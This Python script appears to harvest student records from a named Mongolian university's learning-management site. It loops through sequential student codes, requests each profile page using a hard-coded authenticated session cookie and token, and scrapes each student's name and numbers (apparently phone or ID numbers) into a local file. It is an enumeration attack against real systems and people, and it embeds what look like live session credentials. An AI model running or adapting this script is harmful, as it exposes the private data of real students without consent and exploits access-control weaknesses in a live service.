import requests
import re

# file1 = open('info.txt', 'a')

for code1 in range(23, 24, 1):
    for code2 in range(90, 100, 1):
        for code3 in range(200):
            code3 = str(code3)
            if len(code3) == 1:
                code3 = '00' + (code3)
            elif len(code3) == 2:
                code3 = '0' + (code3)
            else:
                code3 = code3 
            code4 = 'B' + str(code1) + '0' + str(code2) + '0' + code3
            
            query = '';

            url = "https://lms.must.edu.mn/Student/user"
            params = {'code': code4}

            headers = {
                'Host': 'lms.must.edu.mn',
                'Cookie': 'ASP.NET_SessionId=u3epjnssenzjhtnvnx2wwwin; __RequestVerificationToken=JeSHxHyovl6lFw_4n23RGYRd_3HtYiQqyxlkUiCGaZ442M_0s2ONQcInUviKylJGblQO1DyZAcsPVQwS9B9NRnsXAet0imWTxBl_cGIlzyg1; _gid=GA1.3.127957095.1697956631; _gat_gtag_UA_157292567_1=1; .ASPXAUTH=9A7CA86EFE90A217F0F5D7DF0620659FEA2B6CF8345B5B34929306AFBDDA4C9A7365E9FACE0DB1616C715D6B20C6B691900213DE4CB9FD0BB3CC3D38796600DB2AD6E32092345BF213D16F04691181A838EADAABC520EA7998D6DC7042834BA6; _ga_PQ6K0GXCEF=GS1.1.1697956631.1.1.1697956650.0.0.0; _ga=GA1.1.441452313.1697956631',
                'Cache-Control': 'max-age=0',
                'Sec-Ch-Ua': '',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '""',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://lms.must.edu.mn/Student/Lesson?lcode=F.NS361&tcode=D.HW08&type=students&ltp=c',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9'
            }

            try:
                response = requests.get(url, params=params, headers=headers)
            
                resText = response.text
                print(resText)

                pattern = r'<p class="name">(.++)'
                match = re.search(pattern, resText)
                ID = match.group(0)[16:].split('/B')
                query += '\n' + (str(ID[0]) + ', B' + str(ID[1][:-2])) + ' , '


                pattern = r'<p class="number">(.++)'
                match = re.search(pattern, resText)
                query += str(match.group(1)[:-5]) 


                pattern = r'<p class="number">(\d+)</p>'
                numbers = re.findall(pattern, resText)

                for number in numbers:
                    query += ', ' + str(number)

                print(query)
                with open('info.txt', 'a', encoding='utf-8') as file1:
                    file1.write(query)
            except:
                print('aldaa ' + code4)
